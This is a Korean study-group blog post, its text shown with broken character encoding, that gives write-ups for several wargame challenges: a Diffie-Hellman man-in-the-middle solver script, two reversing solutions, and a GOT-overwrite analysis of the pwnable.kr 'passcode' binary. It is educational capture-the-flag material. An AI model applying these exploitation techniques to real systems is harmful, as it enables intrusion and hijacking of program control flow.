---
title: "[CAUTION] ìŠ¤í„°ë”” - 11"
categories:
  - study
tags:
  - dreamhack
  - pwnable
toc: true
toc_sticky: true
toc_label: "ìŠ¤í„°ë”” - 11"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/caution2.jpg
---

ğŸ’¡ Caution ìŠ¤í„°ë”” 11íšŒì°¨
{: .notice--warning}

# ì•”í˜¸í•™ - 1

**[Textbook-DH](https://dreamhack.io/wargame/challenges/120/)**

```py
#!/usr/bin/python3
from Cryptodome.Util.number import getPrime
from Cryptodome.Util.Padding import pad, unpad
from Cryptodome.Cipher import AES
import hashlib
import random

class Person(object):
    def __init__(self, p):
        self.p = p
        self.g = 2
        self.x = random.randint(2, self.p - 1)
    
    def calc_key(self):
        self.k = pow(self.g, self.x, self.p)
        return self.k

    def set_shared_key(self, k):
        self.sk = pow(k, self.x, self.p)
        aes_key = hashlib.md5(str(self.sk).encode()).digest()
        self.cipher = AES.new(aes_key, AES.MODE_ECB)

    def encrypt(self, pt):
        return self.cipher.encrypt(pad(pt, 16)).hex()

    def decrypt(self, ct):
        return unpad(self.cipher.decrypt(bytes.fromhex(ct)), 16)

flag = open("flag", "r").read().encode()
prime = getPrime(1024)
print(f"Prime: {hex(prime)}")
alice = Person(prime)
bob = Person(prime)

alice_k = alice.calc_key()
print(f"Alice sends her key to Bob. Key: {hex(alice_k)}")
print("Let's inturrupt !")
alice_k = int(input(">> "))
if alice_k == alice.g:
    exit("Malicious key !!")
bob.set_shared_key(alice_k)

bob_k = bob.calc_key()
print(f"Bob sends his key to Alice. Key: {hex(bob_k)}")
print("Let's inturrupt !")
bob_k = int(input(">> "))
if bob_k == bob.g:
    exit("Malicious key !!")
alice.set_shared_key(bob_k)

print("They are sharing the part of flag")
print(f"Alice: {alice.encrypt(flag[:len(flag) // 2])}")
print(f"Bob: {bob.encrypt(flag[len(flag) // 2:])}")
```

ë””í”¼ í—¬ë§Œì˜ ì¤‘ê°„ì ê³µê²©ì„ ì´ìš©í•˜ì—¬ í”Œë˜ê·¸ë¥¼ íšë“í•˜ëŠ” ë¬¸ì œì´ë‹¤.

ì „ì²´ ê³µê²© í”„ë¡œì„¸ìŠ¤ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.

![image](https://user-images.githubusercontent.com/33647663/168737421-c9b6c563-22e9-4ec6-83e2-289af89b513a.png)

1. attackerëŠ” ì¤‘ê°„ì—ì„œ aliceê°€ bobì—ê²Œ ë³´ë‚´ëŠ” ```2^a mod p```ë¥¼ ë°›ëŠ”ë‹¤. ê·¸ë¦¬ê³  ì´ ê°’ì„ ì €ì¥í•œë‹¤.
2. attackerëŠ” aliceì—ê²Œ ë©”ì‹œì§€ë¥¼ ë°›ê³  bobì—ê²ŒëŠ” ```2^5 mod p```ë¥¼ ì „ì†¡í•œë‹¤.bobì€ attackerì—ê²Œ ë°›ì€ ```2^5 mod p```ë¥¼ í†µí•´ì„œ ```(2^5)b mod p```ë¥¼ ê³„ì‚°í•˜ì—¬ attacker <-> bobì˜ ê³µìœ í‚¤ë¥¼ ê³„ì‚°í•´ ë‚¸ë‹¤. 
3. bobì€ ```2^b mod p``` ë¥¼ ì „ì†¡í•œë‹¤. attackerëŠ” ì´ë¥¼ ë°›ê³  attacker <-> bobì˜ ê³µìœ í‚¤ì¸ ```(2^b)^5 mod p``` ë¥¼ ê³„ì‚°í•˜ì—¬ ê³µìœ í‚¤ë¥¼ êµ¬í•œë‹¤.
4. ë§ˆì§€ë§‰ìœ¼ë¡œ attackerëŠ” aliceì—ê²Œ ```2^5 mod p``` ë¥¼ ì „ì†¡í•˜ì—¬ attacker <-> aliceëŠ” ```(2^a)^5 mod p``` ë¥¼ ê³µìœ í‚¤ë¡œ ê³„ì‚°í•œë‹¤.

ì´ë ‡ê²Œ í•˜ì—¬ ê·¸ë¦¼ê³¼ ê°™ì´ Attacker <=> alice, Attacker <=> bob ê°„ì— í†µì‹ ì´ ë˜ëŠ” ê²ƒì´ë©° ì´ì™€ê°™ì€ ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ” ì´ìœ ëŠ” ë””í”¼ í—¬ë§Œì˜ ì•½ì ì¸ ì§€ê¸ˆ í‚¤ êµí™˜ì„ í•˜ëŠ” ìƒëŒ€ê°€ ì§„ì§œ ê·¸ ìƒëŒ€ì¸ì§€ë¥¼ í™•ì¸í•˜ëŠ” 'ì¸ì¦'ê¸°ëŠ¥ì´ ì—†ê¸° ë•Œë¬¸ì´ë‹¤.

ìœ„ì˜ ì ˆì°¨ëŒ€ë¡œ ì½”ë“œë¥¼ ì‘ì„±í•˜ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.

**sol.py**
```py
#!/usr/bin/python3
from pwn import *

from Cryptodome.Util.number import getPrime
from Cryptodome.Util.Padding import pad, unpad
from Cryptodome.Cipher import AES
import hashlib
import random

class Person(object):
    def __init__(self, p):
        self.p = p
        self.g = 2
        self.x = 5
    
    def calc_key(self):
        self.k = pow(self.g, self.x, self.p)
        return self.k

    def set_shared_key(self, k):
        self.sk = pow(k, self.x, self.p)
        aes_key = hashlib.md5(str(self.sk).encode()).digest()
        self.cipher = AES.new(aes_key, AES.MODE_ECB)

    def encrypt(self, pt):
        return self.cipher.encrypt(pad(pt, 16)).hex()

    def decrypt(self, ct):
        return unpad(self.cipher.decrypt(bytes.fromhex(ct)), 16)

p = remote("host1.dreamhack.games",17625)
# context.log_level = 10

# get prime
p.recvuntil(b"Prime: ")
prime = int(p.recvline()[:-1],16)

attacker_Alice = Person(prime)
attacker_Bob = Person(prime)

# set key Attacker <=> Alice
p.recvuntil(b"Alice sends her key to Bob. Key: ")
alice_public = int(p.recvline()[:-1],16)
attacker_Alice.set_shared_key(alice_public)

p.sendafter(b">> ",b'32\n')

# set key Attacker <=> Bob
p.recvuntil(b"Bob sends his key to Alice. Key: ")
bob_public = int(p.recvline()[:-1],16)
attacker_Bob.set_shared_key(bob_public)

p.sendafter(b">> ",b'32\n')

# decrypt flag
p.recvuntil(b"Alice: ")
alice_encrypt_message = p.recvline()[:-1].decode()
p.recvuntil(b"Bob: ")
bob_encrypt_message = p.recvline()[:-1].decode()

flag=''
flag = attacker_Alice.decrypt(alice_encrypt_message)
flag += attacker_Bob.decrypt(bob_encrypt_message)

print("FLAG : {}".format(flag))
```

ì‹¤í–‰í•˜ë©´ ë‹¤ìŒê³¼ê°™ì´ í”Œë˜ê·¸ë¥¼ êµ¬í•  ìˆ˜ ìˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/168738349-564f0f99-f9ad-4893-b98a-6b91eabbdfa7.png)

    
# ë¦¬ë²„ì‹± - 1
**[Keygen](https://h4ckingga.me/challenges#Keygen-5)**

í”„ë¡œê·¸ë¨ì„ ì‹œì‘í•´ ë³´ë©´ ë‹¤ìŒê³¼ ê°™ì´ Input flagë¥¼ ì…ë ¥í•˜ë¼ê³  ë‚˜ì˜¨ë‹¤.

![image](https://user-images.githubusercontent.com/33647663/168018425-b2e8ae4a-1ed6-40f8-8a35-622fc4c30a91.png)

IDAë¡œ **Input flag**ë¥¼ í…ìŠ¤íŠ¸ë¡œ ì°¾ì•„ë³¸ë‹¤.[Search] -> [text]

![image](https://user-images.githubusercontent.com/33647663/168018823-16ffba0e-8907-4692-af2e-9e50be9b1aea.png)

í•´ë‹¹ í…ìŠ¤íŠ¸ë¥¼ ì°¸ì¡°í•˜ê³  ìˆëŠ” í•¨ìˆ˜ë¥¼ ë¶„ì„ í•´ë³¸ë‹¤.

```c
__int64 sub_1400011C0()
{
  signed int i; // [rsp+20h] [rbp-48h]
  char Buf2; // [rsp+28h] [rbp-40h]
  char v3; // [rsp+29h] [rbp-3Fh]
  char v4; // [rsp+2Ah] [rbp-3Eh]
  char v5; // [rsp+2Bh] [rbp-3Dh]
  char v6; // [rsp+2Ch] [rbp-3Ch]
  char v7; // [rsp+2Dh] [rbp-3Bh]
  char v8; // [rsp+2Eh] [rbp-3Ah]
  char v9; // [rsp+2Fh] [rbp-39h]
  char v10; // [rsp+30h] [rbp-38h]
  char v11; // [rsp+31h] [rbp-37h]
  char v12; // [rsp+32h] [rbp-36h]
  char v13; // [rsp+33h] [rbp-35h]
  char v14; // [rsp+34h] [rbp-34h]
  char v15; // [rsp+35h] [rbp-33h]
  char v16; // [rsp+36h] [rbp-32h]
  char v17; // [rsp+37h] [rbp-31h]
  char v18; // [rsp+38h] [rbp-30h]
  char v19; // [rsp+39h] [rbp-2Fh]
  char v20; // [rsp+3Ah] [rbp-2Eh]
  char v21; // [rsp+3Bh] [rbp-2Dh]
  char v22; // [rsp+3Ch] [rbp-2Ch]
  char Buf1[24]; // [rsp+40h] [rbp-28h]

  Buf2 = 63;
  v3 = 59;
  v4 = 70;
  v5 = 74;
  v6 = 68;
  v7 = 110;
  v8 = 118;
  v9 = 56;
  v10 = 100;
  v11 = 119;
  v12 = 56;
  v13 = 108;
  v14 = 82;
  v15 = 117;
  v16 = 108;
  v17 = 121;
  v18 = 82;
  v19 = 109;
  v20 = 109;
  v21 = 116;
  v22 = 0;
  memset(Buf1, 0, 0x15ui64);
  sub_140001070(aS_1, aInputFlag);
  sub_140001140(aS, Buf1);
  for ( i = 0; i < 20; ++i )
  {
    Buf1[i] ^= 0x11u;
    Buf1[i] ^= 0x1Bu;
    Buf1[i] -= 3;
  }
  if ( !memcmp(Buf1, &Buf2, 0x14ui64) )
    sub_140001070(aS_0, aGoodThisIsFlag);
  else
    sub_140001070(&unk_140004038, aNoThisIsNotFla);
  return 0i64;
}
```

ë­”ê°€ ê¸¸ì–´ ë³´ì´ì§€ë§Œ, ì˜†ì— rbpë¥¼ ê¸°ì¤€ìœ¼ë¡œ ìŠ¤íƒì„ ë¶„ì„í•´ë³´ë©´,v3 ~ v22 ê¹Œì§€ëŠ” ì „ë¶€ buf2ì£¼ì†Œì—ì„œ ì‹œì‘í•˜ëŠ” ë¬¸ìì—´ ì„ì„ ì•Œ ìˆ˜ ìˆë‹¤. ë”°ë¼ì„œ ì½”ë“œë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ì¤„ì¼ ìˆ˜ ìˆë‹¤.

```c
__int64 sub_1400011C0()
{
  signed int i; // [rsp+20h] [rbp-48h]
  char Buf2; // [rsp+28h] [rbp-40h] // ì´ˆê¸°í™”. ìœ„ ì°¸ì¡°

  memset(Buf1, 0, 0x15ui64);
  sub_140001070(aS_1, aInputFlag);
  sub_140001140(aS, Buf1);

  // ìœ„ì— 3ê°œê°€ buf1ì— ì‚¬ìš©ì inputì„ ë‹´ëŠ” í•¨ìˆ˜

  for ( i = 0; i < 20; ++i )
  {
    Buf1[i] ^= 0x11u;
    Buf1[i] ^= 0x1Bu;
    Buf1[i] -= 3;
  }

  // forë¬¸ì„ ëŒë©´ì„œ buf1 20ê°œì— ëŒ€í•´ ì—°ì‚° ìˆ˜í–‰

  if ( !memcmp(Buf1, &Buf2, 0x14ui64) )
    // ì—°ì‚°ì´ ëë‚œ buf1ê³¼ buf2ì˜ ê²°ê³¼ê°€ ê°™ìœ¼ë©´ Clear
    sub_140001070(aS_0, aGoodThisIsFlag);
  else
    sub_140001070(&unk_140004038, aNoThisIsNotFla);
  return 0i64;
}
```

ì‚¬ìš©ì inputì— ëŒ€í•´ì„œ forë¬¸ ì—°ì‚°ì„ ìˆ˜í–‰í•˜ê³ , ê·¸ ê²°ê³¼ë¥¼ buf2ì™€ ê°™ì€ì§€ ë¹„êµí•˜ëŠ” ë¡œì§ì´ë‹¤.

í˜„ì¬ buf2 ë°°ì—´ì˜ ê°’ì€ ì•Œê¸° ë•Œë¬¸ì— forë¬¸ ì—°ì‚°ì„ ê±°ê¾¸ë¡œ buf2ì— ì ìš©í•˜ë©´, buf1 ê°’ì„ ì•Œ ìˆ˜ ìˆë‹¤.

```python
buf2 = [63,59,70,74,68,110,118,56,100,119,56,108,82,117,108,121,82,109,109,116]
buf1 = ''

for i in buf2:
    tmp = i + 3
    tmp ^= 27
    tmp ^= 17
    buf1 += chr(tmp)


for i in buf1:
    print(i,end='')
```

ì‹¤í–‰í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ í”Œë˜ê·¸ë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/168020398-0aa279a2-1c33-431e-8c2b-e8cd06bb3487.png)


# ë¦¬ë²„ì‹± - 2
**[rev-basic-1](https://dreamhack.io/wargame/challenges/15/)**

í”„ë¡œê·¸ë¨ì„ ì‹œì‘í•˜ë©´ ì‚¬ìš©ì inputì„ ë°›ëŠ”ë‹¤.

![image](https://user-images.githubusercontent.com/33647663/168020825-df942ee0-30bf-47a0-b0cb-951a911217bf.png)

IDAë¥¼ ì¼œì„œ Input ë¬¸ìì—´ì„ ì°¾ëŠ”ë‹¤. [Search] -> [Text]

![image](https://user-images.githubusercontent.com/33647663/168021152-f0ac48b3-d7b0-47bb-a89f-9889a23c102c.png)

í•´ë‹¹ ë¬¸ìì—´ì„ ì°¸ì¡°í•˜ê³  ìˆëŠ” í•¨ìˆ˜ sub_140001350ì„ ë³´ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.

```c
__int64 sub_140001350()
{
  char v1; // [rsp+20h] [rbp-118h]

  memset(&v1, 0, 0x100ui64);
  sub_1400013E0("Input : ");
  sub_140001440("%256s", &v1);
  if ( (unsigned int)sub_140001000(&v1) )
    puts("Correct");
  else
    puts("Wrong");
  return 0i64;
}
```

v1ì— inputì„ ì €ì¥í•˜ê³ , sub_140001000 í•¨ìˆ˜ì— v1ì„ ë„˜ê²¨ì¤€ ë‹¤ìŒ ê·¸ ê²°ê³¼ê°€ trueë©´ correctë¥¼ ì¶œë ¥í•œë‹¤.

sub_140001000 í•¨ìˆ˜ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.

```c
_BOOL8 __fastcall sub_140001000(_BYTE *a1)
{
  if ( *a1 != 67 )
    return 0i64;
  if ( a1[1] != 111 )
    return 0i64;
  if ( a1[2] != 109 )
    return 0i64;
  if ( a1[3] != 112 )
    return 0i64;
  if ( a1[4] != 97 )
    return 0i64;
  if ( a1[5] != 114 )
    return 0i64;
  if ( a1[6] != 51 )
    return 0i64;
  if ( a1[7] != 95 )
    return 0i64;
  if ( a1[8] != 116 )
    return 0i64;
  if ( a1[9] != 104 )
    return 0i64;
  if ( a1[10] != 101 )
    return 0i64;
  if ( a1[11] != 95 )
    return 0i64;
  if ( a1[12] != 99 )
    return 0i64;
  if ( a1[13] != 104 )
    return 0i64;
  if ( a1[14] != 52 )
    return 0i64;
  if ( a1[15] != 114 )
    return 0i64;
  if ( a1[16] != 97 )
    return 0i64;
  if ( a1[17] != 99 )
    return 0i64;
  if ( a1[18] != 116 )
    return 0i64;
  if ( a1[19] != 51 )
    return 0i64;
  if ( a1[20] == 114 )
    return a1[21] == 0;
  return 0i64;
}
```
ë‹¨ìˆœíˆ ë°°ì—´ì˜ ì¸ë±ìŠ¤ì— í•´ë‹¹í•˜ëŠ” ê°’ì´ ê°™ì€ì§€ë§Œ ë¹„êµí•˜ê³  ìˆë‹¤.
ìœ„ì˜ ë‚´ìš©ì„ íŒŒì´ì¬ ì½”ë“œë¡œ ì‘ì„±í•˜ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.

```python
a1 = [67,111,109,112,97,114,51,95,116,104,101,95,99,104,52,114,97,99,116,51,114]

for i in a1:
    print(chr(i),end='')
```

ì‹¤í–‰í•˜ë©´ í”Œë˜ê·¸ë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/168022018-f56fc7ef-2213-4721-b197-6ff8e7a20142.png)

# ì‹œìŠ¤í…œ - 1

**[passcode](https://pwnable.kr/play.php)**


```c
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}

```

ì½”ë“œë¥¼ ë³´ë©´ login í•¨ìˆ˜ì˜ ë‹¤ìŒ ë¶€ë¶„ì´ ì˜ëª» ì½”ë”©ë˜ì—ˆë‹¤.

```diff
- printf("enter passcode1 : ");
- scanf("%d", passcode1);
- fflush(stdin);
```

ì›ë˜ ì •ìƒì ìœ¼ë¡œ scanf í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ë ¤ë©´, ë³€ìˆ˜ì˜ ì£¼ì†Œê°’ì„ ë„˜ê²¨ ì£¼ê¸° ìœ„í•´ì„œ &passcode1ê³¼ ê°™ì´ ë³€ìˆ˜ë¥¼ ë„˜ê²¨ì¤˜ì•¼ í•œë‹¤.
í•˜ì§€ë§Œ í˜„ì¬ ë¬¸ì œì—ì„œëŠ” passcode1ë¡œ ë³€ìˆ˜ë¥¼ ë„˜ê²¨ì£¼ê³  ìˆë‹¤. ì´ë ‡ê²Œ ë˜ë©´ ì–´ë–»ê²Œ ì‘ë™í• ê¹Œ?

ë©”ëª¨ë¦¬ ìƒì— passcodeë³€ìˆ˜ì˜ ì£¼ì†Œê°€ 0xaabb, ë“¤ì–´ìˆëŠ” ê°’ì´ 0xccddë¼ê³  í•˜ì.

![image](https://user-images.githubusercontent.com/33647663/168525721-ac573000-4af2-4a16-a4ee-417ea8f57b73.png)

ê¸°ì¡´ scanf í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ë©´, 0xaabb ì£¼ì†Œì— ì‚¬ìš©ìê°€ ì…ë ¥í•œ ê°’ì´ ë“¤ì–´ê°€ê²Œ ëœë‹¤. í•˜ì§€ë§Œ, í˜„ì¬ëŠ” 0xccdd ì£¼ì†Œì— ì‚¬ìš©ìê°€ ì…ë ¥í•œ ê°’ì´ ì…ë ¥ë˜ëŠ” ê²ƒì´ë‹¤.

ì¦‰ ì´ˆê¸°í™”ë˜ì§€ ì•Šì€ passcode1 ì£¼ì†Œì— ì¡´ì¬í•˜ëŠ” íŠ¹ì • ê°’ì„ ì£¼ì†Œë¡œ í•˜ì—¬ ì ‘ê·¼í•˜ê²Œ ëœë‹¤. ì´ ê°’ì„ í‰ì†Œì—ëŠ” dummyê°’ìœ¼ë¡œ ì·¨ê¸‰í•˜ì§€ë§Œ ì •í™•í•˜ê²ŒëŠ” ì´ì „ì— ì‚¬ìš©ëœ ê°’ì´ ê·¸ëŒ€ë¡œ ë©”ëª¨ë¦¬ì— ë‚¨ì•„ìˆê²Œ ëœë‹¤.

ê·¸ë ‡ë‹¤ë©´ ê·¸ë¦¼ì—ì„œ 0xaabbì£¼ì†Œì— ì €ì¥ë˜ëŠ” ê°’ì„ ì´ì „ì— ë¯¸ë¦¬ ì ‘ê·¼ ê°€ëŠ¥í•˜ë‹¤ë©´, ê·¸ë¦¼ì—ì„œ 0xccddê°€ ì•„ë‹Œ ë‚´ê°€ ì›í•˜ëŠ” ê°’ì„ ë©”ëª¨ë¦¬ì— ì €ì¥í•´ë‘ê³  scanfë¡œ í•´ë‹¹ ì£¼ì†Œì— ë‚´ê°€ ì›í•˜ëŠ” ê°’ì„ ì“¸ ìˆ˜ ìˆê²Œ ëœë‹¤.

main í•¨ìˆ˜ë¥¼ ë³´ë©´ ```welcome()``` í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³  ```login()```í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œë‹¤. ì¦‰ welcome()í•¨ìˆ˜ì—ì„œ ì‚¬ìš©ëœ ìŠ¤íƒ ê³µê°„ê³¼ login()í•¨ìˆ˜ì—ì„œ ì‚¬ìš©ë˜ëŠ” ìŠ¤íƒ ê³µê°„ì´ ê²¹ì¹œë‹¤. 

ë”°ë¼ì„œ welcome()í•¨ìˆ˜ì™€ login()í•¨ìˆ˜ì˜ ìŠ¤íƒì„ ë¹„êµí•´ì•¼ í•œë‹¤.

ë¨¼ì € welcome í•¨ìˆ˜ë¥¼ ë””ìŠ¤ì–´ì…ˆë¸” í•œ ê²°ê³¼ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.

```bash
gdb-peda$ disass welcome
Dump of assembler code for function welcome:
   0x08048609 <+0>:     push   ebp
   0x0804860a <+1>:     mov    ebp,esp
   0x0804860c <+3>:     sub    esp,0x88     //ì´ 136ë°”ì´íŠ¸ ê³µê°„ ì‚¬ìš©
   0x08048612 <+9>:     mov    eax,gs:0x14
   0x08048618 <+15>:    mov    DWORD PTR [ebp-0xc],eax
   0x0804861b <+18>:    xor    eax,eax
   0x0804861d <+20>:    mov    eax,0x80487cb
   0x08048622 <+25>:    mov    DWORD PTR [esp],eax
   0x08048625 <+28>:    call   0x8048420 <printf@plt>
   0x0804862a <+33>:    mov    eax,0x80487dd
   0x0804862f <+38>:    lea    edx,[ebp-0x70] //ebp-112 ì£¼ì†Œê°€ name[100] ê³µê°„
   0x08048632 <+41>:    mov    DWORD PTR [esp+0x4],edx
   0x08048636 <+45>:    mov    DWORD PTR [esp],eax
   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:    mov    eax,0x80487e3
   0x08048643 <+58>:    lea    edx,[ebp-0x70]
   0x08048646 <+61>:    mov    DWORD PTR [esp+0x4],edx
   0x0804864a <+65>:    mov    DWORD PTR [esp],eax
   0x0804864d <+68>:    call   0x8048420 <printf@plt>
   0x08048652 <+73>:    mov    eax,DWORD PTR [ebp-0xc]
   0x08048655 <+76>:    xor    eax,DWORD PTR gs:0x14
   0x0804865c <+83>:    je     0x8048663 <welcome+90>
   0x0804865e <+85>:    call   0x8048440 <__stack_chk_fail@plt>
   0x08048663 <+90>:    leave
   0x08048664 <+91>:    ret
End of assembler dump.

```

login()í•¨ìˆ˜ë¥¼ ë””ìŠ¤ì–´ì…ˆë¸”í•œ ê²°ê³¼ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.

```bash
gdb-peda$ disass login
Dump of assembler code for function login:
   0x08048564 <+0>:     push   ebp
   0x08048565 <+1>:     mov    ebp,esp
   0x08048567 <+3>:     sub    esp,0x28 //ì´ 40ë°”ì´íŠ¸ ê³µê°„
   0x0804856a <+6>:     mov    eax,0x8048770
   0x0804856f <+11>:    mov    DWORD PTR [esp],eax
   0x08048572 <+14>:    call   0x8048420 <printf@plt>
   0x08048577 <+19>:    mov    eax,0x8048783
   0x0804857c <+24>:    mov    edx,DWORD PTR [ebp-0x10]
   0x0804857f <+27>:    mov    DWORD PTR [esp+0x4],edx
   0x08048583 <+31>:    mov    DWORD PTR [esp],eax
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:    mov    eax,ds:0x804a02c
   0x08048590 <+44>:    mov    DWORD PTR [esp],eax
   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
   0x08048598 <+52>:    mov    eax,0x8048786
   0x0804859d <+57>:    mov    DWORD PTR [esp],eax
   0x080485a0 <+60>:    call   0x8048420 <printf@plt>
   0x080485a5 <+65>:    mov    eax,0x8048783
   0x080485aa <+70>:    mov    edx,DWORD PTR [ebp-0xc]
   0x080485ad <+73>:    mov    DWORD PTR [esp+0x4],edx
   0x080485b1 <+77>:    mov    DWORD PTR [esp],eax
   0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:    mov    DWORD PTR [esp],0x8048799
   0x080485c0 <+92>:    call   0x8048450 <puts@plt>
   0x080485c5 <+97>:    cmp    DWORD PTR [ebp-0x10],0x528e6 //passcode1ì€ ebp-16
   0x080485cc <+104>:   jne    0x80485f1 <login+141>
   0x080485ce <+106>:   cmp    DWORD PTR [ebp-0xc],0xcc07c9 //passcode2ëŠ” ebp-12
   0x080485d5 <+113>:   jne    0x80485f1 <login+141>
   0x080485d7 <+115>:   mov    DWORD PTR [esp],0x80487a5
   0x080485de <+122>:   call   0x8048450 <puts@plt>
   0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af
   0x080485ea <+134>:   call   0x8048460 <system@plt>
   0x080485ef <+139>:   leave
   0x080485f0 <+140>:   ret
   0x080485f1 <+141>:   mov    DWORD PTR [esp],0x80487bd
   0x080485f8 <+148>:   call   0x8048450 <puts@plt>
   0x080485fd <+153>:   mov    DWORD PTR [esp],0x0
   0x08048604 <+160>:   call   0x8048480 <exit@plt>
End of assembler dump.

```

ë””ìŠ¤ì–´ì…ˆë¸” ë‚´ìš©ì„ í† ëŒ€ë¡œ ìŠ¤íƒì„ ë¹„êµí•˜ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤. ë‘ê°œì˜ í•¨ìˆ˜ì—ì„œ EBP ê°’ì€ ì„œë¡œ ê°™ë‹¤.

![image](https://user-images.githubusercontent.com/33647663/168528775-b40e9a5c-2dfe-4eb8-b24e-225e936d85d1.png)

ê·¸ë¦¼ì„ ë³´ë©´ ì•Œê² ì§€ë§Œ, Name[100]ì—ì„œ ì‘ì„±ëœ ë§ˆì§€ë§‰ 4byteì— ì“°ì—¬ì§„ ë‚´ìš©ì´ ì¬ì‚¬ìš©ë˜ì–´ login()í•¨ìˆ˜ì—ì„œ ì…ë ¥ë˜ëŠ” ê°’ì˜ ì£¼ì†Œê°€ ë˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ìˆë‹¤.

ë”°ë¼ì„œ Name[100]ì— ë‹¤ìŒê³¼ ê°™ì´ ì‘ì„±í•˜ë©´ ëœë‹¤.

```md
dummy[96] + "ë‚´ê°€ ë³€ê²½í•˜ê³  ì‹¶ì€ ë©”ëª¨ë¦¬ ì£¼ì†Œ 4byte"
```

ì´ë ‡ê²Œ ì„¤ì •í•´ ì£¼ë©´ scanfì—ì„œ ì…ë ¥ëœ ê°’ì´ ```ë‚´ê°€ ë³€ê²½í•˜ê³  ì‹¶ì€ ë©”ëª¨ë¦¬ ì£¼ì†Œ```ì— ê°’ì„ ì €ì¥í•˜ê²Œ ëœë‹¤.

ê·¸ëŸ¬ë©´ ì´ì œ 1) ì–´ë– í•œ ì£¼ì†Œì— 2) ì–´ë– í•œ ê°’ì„ ë„£ì–´ì•¼ í•  ì§€ ìƒê°í•´ ë´ì•¼í•œë‹¤.


## PLT,GOT
loginí•¨ìˆ˜ ë‚´ì—ì„œ scanfë¥¼ ìˆ˜í–‰í•˜ê³ ë‚˜ì„œ fflushì˜ pltë¥¼ ì°¸ì¡°í•˜ì—¬ got í…Œì´ë¸”ë¡œ ì™¸ë¶€ ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ì‹¤ì œ fflush í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ë°›ì•„ì˜¨ë‹¤. ì´ë¥¼ ì´ìš©í•´ì„œ fflushì˜ gotë¥¼ ë³€ê²½í•˜ì—¬ fflush í•¨ìˆ˜ê°€ ì•„ë‹Œ ë‹¤ë¥¸ ê³³ìœ¼ë¡œ í”„ë¡œê·¸ë¨ì˜ ìˆ˜í–‰ì„ ë³€ê²½ì‹œí‚¨ë‹¤.

```sh
   0x0804857c <+24>:    mov    edx,DWORD PTR [ebp-0x10]
   0x0804857f <+27>:    mov    DWORD PTR [esp+0x4],edx
   0x08048583 <+31>:    mov    DWORD PTR [esp],eax
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:    mov    eax,ds:0x804a02c
   0x08048590 <+44>:    mov    DWORD PTR [esp],eax
   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
```

fflush@pltë¥¼ ìˆ˜í–‰í•˜ëŠ” 0x08048430ë¶€ë¶„ì„ ë³´ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.
0x804a004ì— ì €ì¥ëœ ê°’ìœ¼ë¡œ jmpë¥¼ ì‹œë„í•˜ê³  ìˆë‹¤. ì—¬ê¸°ì„œ 0x804a0040ê°€ fflushì˜ gotì´ë‹¤. 

```sh
gdb-peda$ x/4i 0x8048430
   0x8048430 <fflush@plt>:      jmp    DWORD PTR ds:0x804a004
   0x8048436 <fflush@plt+6>:    push   0x8
   0x804843b <fflush@plt+11>:   jmp    0x8048410
   0x8048440 <__stack_chk_fail@plt>:    jmp    DWORD PTR ds:0x804a008
```

ì•„ì§ í”„ë¡œê·¸ë¨ì„ ì‹œì‘í•˜ê¸° ì „ì´ê¸° ë•Œë¬¸ì— got í…Œì´ë¸”ì˜ ê°’ì„ ì¶œë ¥í•´ë³´ë©´ 0x8048436ì´ë‹¤. ì´ëŠ” fflush@plt+6 ì´ë‹¤.

```sh
gdb-peda$ x/xw 0x804a004
0x804a004 <fflush@got.plt>:     0x08048436
```

ì¦‰ ì›ë˜ë¼ë©´ fflush@pltë¥¼ ì²˜ìŒ ìˆ˜í–‰í•˜ë©´ got í…Œì´ë¸”(0x804a004)ì— ì €ì¥ëœ plt+6(0x8048436) ìœ¼ë¡œ ì´ë™í•˜ì—¬ ìˆ˜í–‰ì´ ê³„ì†ëœë‹¤.

í•˜ì§€ë§Œ ì´ë¥¼ ë‚´ê°€ ì›í•˜ëŠ” ê³³ìœ¼ë¡œ ë°”ê¿”ì„œ í”„ë¡œê·¸ë¨ íë¦„ì„ ë°”ê¿€ ìˆ˜ ìˆë‹¤.

